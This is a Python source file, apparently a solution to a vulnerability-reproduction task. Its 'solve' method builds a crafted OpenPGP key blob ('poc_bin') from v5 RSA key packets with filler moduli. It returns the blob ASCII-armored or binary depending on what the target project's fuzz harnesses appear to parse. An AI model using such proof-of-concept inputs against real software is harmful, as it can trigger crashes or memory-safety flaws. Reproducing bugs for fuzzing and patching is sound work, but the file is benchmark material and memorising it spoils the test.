import os
import io
import re
import tarfile
import base64
from typing import Iterable, Optional


def _encode_new_format_length(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 192:
        return bytes([n])
    if n < 8384:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    return bytes([255]) + n.to_bytes(4, "big")


def _pgp_packet(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("tag out of range")
    hdr = bytes([0xC0 | tag]) + _encode_new_format_length(len(body))
    return hdr + body


def _mpi_from_int_bytes(x: bytes) -> bytes:
    x = x.lstrip(b"\x00") or b"\x00"
    bitlen = (len(x) - 1) * 8 + (x[0].bit_length() if x else 0)
    return bitlen.to_bytes(2, "big") + x


def _build_v5_rsa_public_key_packet(tag: int, nbits: int = 2048, t: int = 0) -> bytes:
    if nbits < 64:
        nbits = 64
    nbytes = (nbits + 7) // 8
    first = 1 << ((nbits - 1) % 8)
    modulus = bytes([first]) + b"\xAA" * (nbytes - 1)
    exponent = b"\x01\x00\x01"  # 65537

    mpi_n = _mpi_from_int_bytes(modulus)
    mpi_e = _mpi_from_int_bytes(exponent)
    key_material = mpi_n + mpi_e

    body = bytearray()
    body.append(5)  # version
    body += int(t).to_bytes(4, "big", signed=False)
    body.append(1)  # RSA
    body += len(key_material).to_bytes(4, "big", signed=False)
    body += key_material
    return _pgp_packet(tag, bytes(body))


def _build_userid_packet(userid: str) -> bytes:
    b = userid.encode("utf-8", errors="strict")
    return _pgp_packet(13, b)


def _crc24_openpgp(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= (b & 0xFF) << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor_public_key(binary: bytes) -> bytes:
    b64 = base64.b64encode(binary).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24_openpgp(binary)
    crc_b64 = base64.b64encode(crc.to_bytes(3, "big")).decode("ascii")
    out = []
    out.append("-----BEGIN PGP PUBLIC KEY BLOCK-----\n")
    out.append("\n")
    for ln in lines:
        out.append(ln + "\n")
    out.append("=" + crc_b64 + "\n")
    out.append("-----END PGP PUBLIC KEY BLOCK-----\n")
    return "".join(out).encode("ascii")


def _iter_source_text_files_from_dir(root: str) -> Iterable[tuple[str, bytes]]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".rs", ".go", ".java", ".kt", ".m", ".mm"}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() not in exts:
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    yield p, f.read()
            except OSError:
                continue


def _iter_source_text_files_from_tar(tar_path: str) -> Iterable[tuple[str, bytes]]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".rs", ".go", ".java", ".kt", ".m", ".mm"}
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name)
            if ext.lower() not in exts:
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            yield name, data


def _detect_prefer_armored(src_path: str) -> bool:
    def looks_like_fuzz_file(path: str, text: str) -> bool:
        p = path.lower()
        if "fuzz" in p or "fuzzer" in p or "oss-fuzz" in p:
            return True
        if "llvmfuzzertestoneinput" in text:
            return True
        return False

    armor_score = 0
    binary_score = 0

    it = None
    if os.path.isdir(src_path):
        it = _iter_source_text_files_from_dir(src_path)
    elif os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
        it = _iter_source_text_files_from_tar(src_path)

    if it is None:
        return False

    for path, data in it:
        if not data:
            continue
        text = data[:300_000].decode("utf-8", errors="ignore").lower()
        if not looks_like_fuzz_file(path, text):
            continue

        if "llvmfuzzertestoneinput" in text:
            binary_score += 2

        if "-----begin pgp" in text or "begin pgp public key block" in text:
            armor_score += 4
        if re.search(r"\bdearmor\b", text) or re.search(r"\barmou?r(ed|)\b", text) or re.search(r"\bradix-64\b", text):
            armor_score += 2
        if re.search(r"\bparse_armor\b", text) or re.search(r"\bparsearm(or|ou?r)\b", text):
            armor_score += 2

        if re.search(r"\bparse_packets?\b", text) or re.search(r"\bload_keys?\b", text) or re.search(r"\bopenpgp\b", text):
            binary_score += 1

        if armor_score >= 6:
            return True

    return armor_score > binary_score + 2


class Solution:
    def solve(self, src_path: str) -> bytes:
        primary = _build_v5_rsa_public_key_packet(tag=6, nbits=2048, t=0)
        uid = _build_userid_packet("a")
        subkey = _build_v5_rsa_public_key_packet(tag=14, nbits=2048, t=0)
        poc_bin = primary + uid + subkey

        if _detect_prefer_armored(src_path):
            return _armor_public_key(poc_bin)
        return poc_bin